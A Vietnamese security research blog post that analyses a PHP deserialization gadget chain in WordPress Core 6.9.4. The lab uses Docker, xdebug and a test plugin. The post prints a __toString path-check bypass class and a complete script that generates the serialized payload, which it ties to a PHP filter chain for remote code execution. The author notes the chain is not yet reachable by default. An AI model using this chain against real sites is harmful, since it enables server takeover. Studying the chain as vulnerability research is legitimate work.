---
title: (VietNamese) WordPress POP Chain
date: 2026-05-05 08:11:45
top_img: /img/Wordpress/image.png
cover: /img/Wordpress/image.png
categories:
  - WordPress POP Chain Analysis
toc: true
---
## Introduction
Trong quá trình thực hiện task nghiên cứu về POP Chain trên WordPress dưới sự hướng dẫn của người anh, mình đã phát hiện ra lỗ hổng `Insecure Deserialization` bắt nguồn từ việc plugin xử lý dữ liệu đầu vào thiếu an toàn. Hiện tại, PoC mới chỉ chứng minh được khả năng khởi tạo class bất kỳ và bypass filter, chưa đạt đến mức thực thi shell (RCE) trên máy chủ. Vì vậy, hướng tiếp cận sắp tới là rà soát các POP Chain trong WordPress Core để mở rộng phạm vi khai thác.

## Setup Lab Enviroment
Với những điều kiện trên, để mô phỏng được WordPress POP Chain mình cài đặt bản mới nhất <a href="https://wordpress.org/download/releases/">Wordpress Core Version 6.9.4</a> và sử dụng Docker để dựng lại môi trường.
Tạo thêm 1 file để hỗ trợ debug trong quá trình mô phỏng ở đây tôi tạo 1 file `xdebug.ini`
```ini
xdebug.mode=debug
xdebug.start_with_request=yes
xdebug.client_host=host.docker.internal
xdebug.client_port=9003
xdebug.log=/tmp/xdebug.log
xdebug.log_level=7
```
Set cấu hình `xdebug` vào `docker`
```docker
FROM wordpress:6.9.4
RUN pecl install xdebug \
    && docker-php-ext-enable xdebug
COPY xdebug.ini /usr/local/etc/php/conf.d/99-xdebug.ini
```
![alt text](/img/Wordpress/image-1.png)

## Step-by-step analysis
Sau khi quá trình setup hoàn tất và những thứ liên quan trong việc mô phỏng thì mình tiếp tục tạo tiếp 1 plugin như sau để có thể debug được Wordpress POP Chain này.
![alt text](/img/Wordpress/image-2.png)
Như bài blog của người anh đi trước có nói ở my-plugin này có sử dụng thêm hàm `wp-unslash` vì lí do trong wordpress core sẽ tự động gọi đến hàm `add_magic_quotes` nhằm mục đích tránh các lỗi `SQL Injection` hay `XSS` do đó payload chúng ta truyền vào sẽ bị offset error trong quá trình Deserialize payload.
![alt text](/img/Wordpress/image-3.png)
Chính vì điều này nên để thực hiện ` Insecure Deserialization` thành công ở trên Wordpress thì ở control data cần phải có các function như `Base64_decode`, `wp_unslash`, `urldecode`...
Ở đây mình sẽ bắt đầu bước đầu tiên ở chain nằm ở class `ParagonIE_Sodium_Core_Poly1305_State` ở `wordpress/wp-includes/sodium_compat/src/Core/Poly1305/State.php`.
![alt text](/img/Wordpress/image-4.png)
![alt text](/img/Wordpress/image-5.png)
Khi gọi đền function `__destruct()` nó lấy các giá trị offset tăng dần theo `$this->r` và lúc này biến `$this->r` mình sẽ set nó là Object của class `WP_Block` nằm trong file `class-wp-block-list.php`
```php
class WP_Block_List implements Iterator, ArrayAccess, Countable {
    protected $blocks;
    protected $available_context;
    protected $registry;
    public function __construct( $blocks, $available_context = array(), $registry = null ) {
		if ( ! $registry instanceof WP_Block_Type_Registry ) {
			$registry = WP_Block_Type_Registry::get_instance();
		}

		$this->blocks            = $blocks;
		$this->available_context = $available_context;
		$this->registry          = $registry;
	}
    [....]
    #[ReturnTypeWillChange]
	public function offsetGet( $offset ) {
		$block = $this->blocks[ $offset ];

		if ( isset( $block ) && is_array( $block ) ) {
			$block = new WP_Block( $block, $this->available_context, $this->registry );

			$this->blocks[ $offset ] = $block;
		}

		return $block;
	}
}
```
Ở đây chúng ta có thể thấy ở `WP_Block_List` gọi đền function `offsetGet` và may mắn thay lúc này đồng thời class `WP_Block_List` đã implement class `ArrayAccess`. Sau khi đi theo flow chain `WP_Block` chúng ta có thể xem tiếp ở class `WP_Block`
![alt text](/img/Wordpress/image-6.png)
Khi đi vào class `WP_Block` nó khởi tạo 1 construct sau đó gọi đến function `get_registered` của class nào được khai báo ở trong biến `$this->registry`. Và tiếp tục ở đây biến `$registry` mình sẽ set nó là Object của class `WP_Block_Patterns_Registry` nằm trong file `class-WP_Block_Patterns_Registry`
![alt text](/img/Wordpress/image-7.png)
Lúc này function `get_registered` nó nhận `$pattern_name` sau đó thực hiện gọi đến function `get_content($pattern_name)` và lúc này function `get_content` là điểm sink cuối cùng gây ra lỗi chúng ta cùng xem xét function nó xử lý.
```php
	private function get_content( $pattern_name, $outside_init_only = false ) {
		if ( $outside_init_only ) {
			$patterns = &$this->registered_patterns_outside_init;
		} else {
			$patterns = &$this->registered_patterns;
		}

		$file_path    = $patterns[ $pattern_name ]['filePath'] ?? '';
		$is_stringy   = is_string( $file_path ) || ( is_object( $file_path ) && method_exists( $file_path, '__toString' ) );
		$pattern_path = $is_stringy ? realpath( (string) $file_path ) : null;
		if (
			! isset( $patterns[ $pattern_name ]['content'] ) &&
			is_string( $pattern_path ) &&
			( str_ends_with( $pattern_path, '.php' ) || str_ends_with( $pattern_path, '.html' ) ) &&
			is_file( $pattern_path ) &&
			is_readable( $pattern_path )
		) {
			ob_start();
			include $patterns[ $pattern_name ]['filePath'];
			$patterns[ $pattern_name ]['content'] = ob_get_clean();
			unset( $patterns[ $pattern_name ]['filePath'] );
		}

		return $patterns[ $pattern_name ]['content'];
	}
```
Ở đây nó có filter một số như là nó sẽ check đầu vào filepath chuẩn hóa đầu vào tránh PathTraversal và kiểm tra Objecct có phải là `to_string` sau đó nó sẽ kiểm tra thêm `filepath` chúng ta có phải kết thuscc là `.php hay .html` sau đó gọi đến include với giá trị `include $patterns[ $pattern_name ]['filePath']; ` đưa thẳng vào include file.
## Bypass Filter
Với filter của điểm cuối `get_content` trên là chưa đủ attacker có thể bypass với đoạn code trên như sau
> Lần 1: `realpath((string) $file_path)` ép Object String để kiểm tra.
> Lần 2: `include $patterns[ $pattern_name ]['filePath'];` nó ép String lần nữa và nếu lúc này `file_path` lúc này là `Object to_string()` đổi giá trị 2 lần gọi, thì lần 1 nó check là Path A còn include nó dùng Path B.
> Còn phần kết thúc `.php` chúng ta có thể sử dụng tool <a href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a> để bypass
### Code Demo Bypass
```php
class Exploit_ToString_Bypass {
    private $count = 0;
    private $valid_path;
    private $malicious_payload;

    public function __construct($valid_path, $malicious_payload) {
        $this->valid_path = $valid_path;
        $this->malicious_payload = $malicious_payload;
    }

    public function __toString() {
        if ($this->count === 0) {
            $this->count++;
            return $this->valid_path;
        } else {
            return $this->malicious_payload;
        }
    }
}
```
Và những cái phân tích trên là Sink POP Chain vì ở đây chúng ta có thể sử dụng PHP Filter Chain để LFI to RCE.
## Work Flow POP Chain
`WP_Block_Patterns_Registry` -> `WP_Block_List` -> `ParagonIE_Sodium_Core_Poly1305_State` -> `__destruct()`
## POC RCE
1. Generate Payload
![alt text](/img/Wordpress/image-8.png)
2. Generate Payload PHP Serialize Kèm thêm Class Bypass Filter
```php
<?php
class Exploit_ToString_Bypass {
    private $count = 0;
    private $valid_path;
    private $malicious_payload;

    public function __construct($valid_path, $malicious_payload) {
        $this->valid_path = $valid_path;
        $this->malicious_payload = $malicious_payload;
    }

    public function __toString() {
        if ($this->count === 0) {
            $this->count++;
            return $this->valid_path;
        } else {
            return $this->malicious_payload;
        }
    }
}

// 1. Class WP_Block_Patterns_Registry (Thuộc tính private)
class WP_Block_Patterns_Registry {
    private $registered_patterns;
    private $registered_patterns_outside_init;

    public function __construct() {
        $valid_file = "/var/www/html/index.php";

        // Payload RCE qua filterchain
        $malicious_scheme = "MY_PAYLOAD";

        $bypass_object = new Exploit_ToString_Bypass($valid_file, $malicious_scheme);

        $this->registered_patterns = [
            "pwn/slug" => [
                "name" => "pwn/slug",
                "title" => "x",
                // Chèn Object vào đúng vị trí filePath
                "filePath" => $bypass_object
            ]
        ];
        $this->registered_patterns_outside_init = [];
    }
}

// 2. Class WP_Block_List (Thuộc tính protected)
class WP_Block_List {
    protected $blocks;
    protected $available_context;
    protected $registry;

    public function __construct() {
        $this->blocks = [
            0 => [
                "blockName" => "pwn/slug",
                "attrs" => [],
                "innerBlocks" => [],
                "innerHTML" => "",
                "innerContent" => []
            ]
        ];
        $this->available_context = [];
        $this->registry = new WP_Block_Patterns_Registry();
    }
}

// 3. Class ParagonIE_Sodium_Core_Poly1305_State (Thuộc tính mix protected/public)
class ParagonIE_Sodium_Core_Poly1305_State {
    protected $buffer;
    protected $final;
    public $h;
    protected $leftover;
    public $r;
    public $pad;

    public function __construct() {
        $this->buffer = [];
        $this->final = false;
        $this->h = [0, 0, 0, 0, 0];
        $this->leftover = 0;
        $this->r = new WP_Block_List();
        $this->pad = [0, 0, 0, 0];
    }
}

$pop_chain = new ParagonIE_Sodium_Core_Poly1305_State();
$serialized_data = serialize($pop_chain);

echo "--- RAW SERIALIZED DATA ---\n";
echo $serialized_data . "\n\n";

echo "--- URL ENCODED PAYLOAD ---\n";
echo urlencode($serialized_data) . "\n";
?>
```
![alt text](/img/Wordpress/image-9.png)
Tuy nhiên nhược điểm của chain này là vì class ParagonIE_Sodium_Core_Poly1305_State không hề tồn tại trong quá trình chạy Wordpress core ở Linux instance và mặc định nó đã tắt nên chúng ta không thể gọi đến function `offsetGet` của `class WP_Block_List` được. Chính vì vậy để khai thác được thì chúng ta còn phải xem thử sau khi plugin thực hiện `class WP_Block_List` có tiến hành xử lí thêm như là access vào index của một property nào đó của object đó không.
